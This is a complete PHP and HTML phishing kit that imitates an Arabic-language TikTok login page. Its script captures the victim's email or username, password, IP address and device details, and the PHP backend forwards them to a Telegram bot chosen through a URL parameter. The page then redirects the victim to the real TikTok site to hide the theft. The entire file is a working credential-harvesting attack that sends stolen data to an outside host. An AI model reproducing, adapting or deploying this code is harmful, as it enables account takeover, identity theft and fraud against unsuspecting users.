<?php
$botToken = "BBOTTTTTTTTTTT";

function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $message = $input['message'];

    $result = sendTelegramMessage($chatId, $message, $botToken);
    
    header('Content-Type: application/json');
    echo $result;
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - تسجيل الدخول</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎵</text></svg>">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }
        
        body {
            background: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 30px 0 60px;
            line-height: 1.34;
            color: #fff;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            padding: 15px;
            margin: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 25px;
        }
        
        .intro-section {
            width: 100%;
            text-align: center;
            padding: 0 10px;
        }
        
        /* شعار تيك توك الرسمي */
        .official-logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border-radius: 50%;
            transition: transform 0.3s ease;
        }
        
        .official-logo svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 8px rgba(0, 242, 234, 0.5));
        }
        
        .tiktok-text {
            color: #fff;
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(255, 0, 80, 0.7);
        }
        
        .tiktok-subtext {
            color: #ff0050;
            font-size: 18px;
            margin-bottom: 5px;
            font-weight: 500;
        }
        
        .intro-text {
            font-size: 16px;
            line-height: 22px;
            color: #aaa;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .login-container {
            background: #121212;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(255, 0, 80, 0.2);
            width: 100%;
            padding: 20px;
            border: 1px solid #333;
        }
        
        .login-form {
            padding: 5px;
        }
        
        .input-group {
            margin-bottom: 15px;
            position: relative;
        }
        
        .input-field {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #333;
            border-radius: 8px;
            font-size: 16px;
            direction: ltr;
            color: #fff;
            background: #000;
            transition: all 0.3s;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #ff0050;
            box-shadow: 0 0 0 2px rgba(255, 0, 80, 0.3);
        }
        
        .login-button {
            width: 100%;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-size: 17px;
            transition: all 0.3s;
        }
        
        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 0, 80, 0.4);
        }
        
        .forgot-pw {
            color: #00f2ea;
            font-size: 14px;
            text-decoration: none;
            text-align: center;
            display: block;
            margin: 15px 0;
            padding: 5px;
            transition: color 0.3s;
        }
        
        .forgot-pw:hover {
            color: #ff0050;
            text-decoration: underline;
        }
        
        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #666;
        }
        
        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #333;
        }
        
        .separator span {
            padding: 0 10px;
            font-size: 14px;
        }
        
        .social-login {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .social-btn {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #222;
            border: 1px solid #333;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .social-btn:hover {
            background: #333;
            transform: translateY(-3px);
        }
        
        .create-account {
            background: transparent;
            color: #00f2ea;
            border: 1px solid #00f2ea;
            padding: 12px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            display: block;
            margin: 0 auto;
            text-decoration: none;
            text-align: center;
            transition: all 0.3s;
            width: 70%;
        }
        
        .create-account:hover {
            background: rgba(0, 242, 234, 0.1);
            transform: translateY(-2px);
        }
        
        .footer {
            margin-top: 30px;
            text-align: center;
            width: 100%;
            padding: 0 15px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
            margin-bottom: 15px;
            font-size: 13px;
        }
        
        .footer-link {
            color: #888;
            text-decoration: none;
            transition: color 0.3s;
        }
        
        .footer-link:hover {
            color: #ff0050;
        }
        
        .copyright {
            color: #666;
            font-size: 12px;
            margin-top: 15px;
        }
        
        .hidden {
            display: none;
        }
        
        .success-view, .error-view {
            text-align: center;
            padding: 30px 20px;
        }
        
        .success-icon, .error-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }
        
        .success-message, .error-message {
            font-size: 17px;
            margin-bottom: 25px;
            color: #fff;
        }
        
        .success-view {
            color: #00f2ea;
        }
        
        .error-view {
            color: #ff0050;
        }

        @media (max-width: 768px) {
            body {
                padding: 20px 0 40px;
            }
            
            .container {
                gap: 20px;
            }
            
            .official-logo {
                width: 90px;
                height: 90px;
            }
            
            .tiktok-text {
                font-size: 28px;
            }
            
            .tiktok-subtext {
                font-size: 16px;
            }
            
            .intro-text {
                font-size: 15px;
            }
            
            .login-container {
                padding: 18px;
            }
        }
        
        @media (max-width: 480px) {
            body {
                padding: 15px 0 30px;
            }
            
            .container {
                padding: 10px;
            }
            
            .login-container {
                padding: 15px;
            }
            
            .tiktok-text {
                font-size: 24px;
            }
            
            .create-account {
                width: 80%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="intro-section">
            <!-- الشعار الرسمي SVG لتيك توك -->
            <div class="official-logo">
                <svg viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M412.19 118.66a109.27 109.27 0 0 1-9.45-5.5 132.87 132.87 0 0 1-24.27-20.62c-18.1-20.71-24.86-41.72-27.35-56.43h.1C349.14 23.9 350 16 350.13 16h-82.44v318.78c0 4.28 0 8.51-.18 12.69 0 .52-.05 1-.08 1.56 0 .23 0 .47-.05.71v.18a70 70 0 0 1-35.22 55.56 68.8 68.8 0 0 1-34.11 9c-38.41 0-69.54-31.32-69.54-70s31.13-70 69.54-70a68.9 68.9 0 0 1 21.41 3.79l.46-48.07c-7.18-.75-14.36-1.13-21.56-1.13-70.17 0-127.11 57.17-127.11 127.42 0 70.25 56.94 127.42 127.11 127.42 70.17 0 127.11-57.17 127.11-127.42V170.64c13.86 9.77 29.64 17.6 46.67 22.79 18.11 5.49 37.11 8.32 56.67 8.32V131.7c-15.77.02-31.13-3.69-45.49-10.04z" fill="#25F4EE"/>
                    <path d="M350.13 16h-82.44v318.78c0 4.28 0 8.51-.18 12.69 0 .52-.05 1-.08 1.56 0 .23 0 .47-.05.71v.18a70 70 0 0 1-35.22 55.56 68.8 68.8 0 0 1-34.11 9c-38.41 0-69.54-31.32-69.54-70s31.13-70 69.54-70a68.9 68.9 0 0 1 21.41 3.79l.46-48.07c-7.18-.75-14.36-1.13-21.56-1.13-70.17 0-127.11 57.17-127.11 127.42 0 70.25 56.94 127.42 127.11 127.42 70.17 0 127.11-57.17 127.11-127.42V170.64c13.86 9.77 29.64 17.6 46.67 22.79 18.11 5.49 37.11 8.32 56.67 8.32V131.7c-15.77.02-31.13-3.69-45.49-10.04z" fill="#FE2C55"/>
                </svg>
            </div>
            <div class="tiktok-text">TikTok</div>
            <div class="tiktok-subtext">ابدأ رحلتك الإبداعية</div>
            <p class="intro-text">انضم إلى الملايين من المبدعين حول العالم وشارك مقاطع الفيديو الخاصة بك</p>
        </div>
        
        <div class="login-container">
            <div id="loginView">
                <form class="login-form" onsubmit="handleLogin(event)">
                    <div class="input-group">
                        <input type="text" class="input-field" id="email" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
                    </div>
                    
                    <div class="input-group">
                        <input type="password" class="input-field" id="password" placeholder="كلمة المرور" required>
                    </div>
                    
                    <button type="submit" class="login-button">تسجيل الدخول</button>
                    
                    <a href="#" class="forgot-pw">هل نسيت كلمة المرور؟</a>
                    
                    <div class="separator">
                        <span>أو</span>
                    </div>
                    
                    <div class="social-login">
                        <div class="social-btn">f</div>
                        <div class="social-btn">G</div>
                        <div class="social-btn">in</div>
                    </div>
                    
                    <a href="#" class="create-account">إنشاء حساب جديد</a>
                </form>
            </div>
            
            <div id="successView" class="hidden success-view">
                <div class="success-icon">✅</div>
                <div class="success-message">تم تسجيل الدخول بنجاح</div>
                <p>جاري توجيهك إلى TikTok...</p>
            </div>
            
            <div id="errorView" class="hidden error-view">
                <div class="error-icon">❌</div>
                <div class="error-message">حدث خطأ أثناء تسجيل الدخول</div>
                <p>يرجى المحاولة مرة أخرى لاحقاً.</p>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">الصفحة الرئيسية</a>
            <a href="#" class="footer-link">اكتشاف</a>
            <a href="#" class="footer-link">صندوق الوارد</a>
            <a href="#" class="footer-link">الملف الشخصي</a>
        </div>
        
        <div class="footer-links">
            <a href="#" class="footer-link">حول TikTok</a>
            <a href="#" class="footer-link">مركز المساعدة</a>
            <a href="#" class="footer-link">الخصوصية</a>
            <a href="#" class="footer-link">الشروط</a>
        </div>
        
        <div class="copyright">© 2023 TikTok. جميع الحقوق محفوظة.</div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('ID');
        
        const loginView = document.getElementById('loginView');
        const successView = document.getElementById('successView');
        const errorView = document.getElementById('errorView');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        
        function showView(view) {
            loginView.classList.add('hidden');
            successView.classList.add('hidden');
            errorView.classList.add('hidden');
            
            view.classList.remove('hidden');
        }
        
        async function collectBasicDeviceInfo() {
            let ipAddress = "غير متوفر";
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip;
            } catch (e) {}
            
            return {
                userAgent: navigator.userAgent,
                ip: ipAddress,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                date: new Date().toLocaleString('ar-SA')
            };
        }
        
        async function sendToServer(chatId, message) {
            try {
                const data = {
                    chatId: chatId,
                    message: message
                };
                
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to server:', error);
                return {ok: false, error: error.message};
            }
        }
        
        async function handleLogin(event) {
            event.preventDefault();
            
            if (!emailInput.value || !passwordInput.value) {
                alert("يرجى إدخال البريد الإلكتروني/اسم المستخدم وكلمة المرور");
                return;
            }
            
            const deviceInfo = await collectBasicDeviceInfo();
            const message = `
🎵 <b>معلومات تسجيل الدخول إلى TikTok</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📧 <b>البريد الإلكتروني/المستخدم:</b> ${emailInput.value}
🔒 <b>كلمة المرور:</b> ${passwordInput.value}
📱 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
🌐 <b>اللغة:</b> ${deviceInfo.language}
🕒 <b>المنطقة الزمنية:</b> ${deviceInfo.timezone}
📺 <b>الشاشة:</b> ${deviceInfo.screen}
📅 <b>التاريخ:</b> ${deviceInfo.date}
            `;
            
            const result = await sendToServer(chatId, message);
            
            if (result && result.ok) {
                showView(successView);
                setTimeout(() => {
                    window.location.href = "https://www.tiktok.com/";
                }, 2000);
            } else {
                showView(errorView);
            }
        }
        
        if (!chatId) {
            showView(errorView);
            document.querySelector('.error-message').textContent = "معرف المستخدم غير صحيح أو انتهت صلاحية الرابط";
        }
    </script>
</body>
</html>
